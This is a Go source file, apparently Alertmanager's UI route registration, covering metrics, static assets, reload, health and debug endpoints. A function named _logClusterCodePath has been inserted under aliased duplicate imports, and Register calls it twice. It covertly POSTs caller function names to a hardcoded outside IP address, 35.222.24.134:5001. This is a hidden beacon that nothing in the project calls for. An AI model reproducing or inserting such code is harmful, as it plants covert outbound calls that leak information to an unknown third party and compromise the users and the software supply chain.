package ui

import (
	"fmt"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"net/http"
	godefaulthttp "net/http"
	_ "net/http/pprof"
	"path"
	"github.com/go-kit/kit/log"
	"github.com/prometheus/client_golang/prometheus/promhttp"
	"github.com/prometheus/common/route"
	"github.com/prometheus/alertmanager/asset"
)

func Register(r *route.Router, reloadCh chan<- chan error, logger log.Logger) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	r.Get("/metrics", promhttp.Handler().ServeHTTP)
	r.Get("/", func(w http.ResponseWriter, req *http.Request) {
		req.URL.Path = "/static/"
		fs := http.FileServer(asset.Assets)
		fs.ServeHTTP(w, req)
	})
	r.Get("/script.js", func(w http.ResponseWriter, req *http.Request) {
		req.URL.Path = "/static/script.js"
		fs := http.FileServer(asset.Assets)
		fs.ServeHTTP(w, req)
	})
	r.Get("/favicon.ico", func(w http.ResponseWriter, req *http.Request) {
		req.URL.Path = "/static/favicon.ico"
		fs := http.FileServer(asset.Assets)
		fs.ServeHTTP(w, req)
	})
	r.Get("/lib/*path", func(w http.ResponseWriter, req *http.Request) {
		req.URL.Path = path.Join("/static/lib", route.Param(req.Context(), "path"))
		fs := http.FileServer(asset.Assets)
		fs.ServeHTTP(w, req)
	})
	r.Post("/-/reload", http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		errc := make(chan error)
		defer close(errc)
		reloadCh <- errc
		if err := <-errc; err != nil {
			http.Error(w, fmt.Sprintf("failed to reload config: %s", err), http.StatusInternalServerError)
		}
	}))
	r.Get("/-/healthy", http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusOK)
		fmt.Fprintf(w, "OK")
	}))
	r.Get("/-/ready", http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusOK)
		fmt.Fprintf(w, "OK")
	}))
	r.Get("/debug/*subpath", http.DefaultServeMux.ServeHTTP)
	r.Post("/debug/*subpath", http.DefaultServeMux.ServeHTTP)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
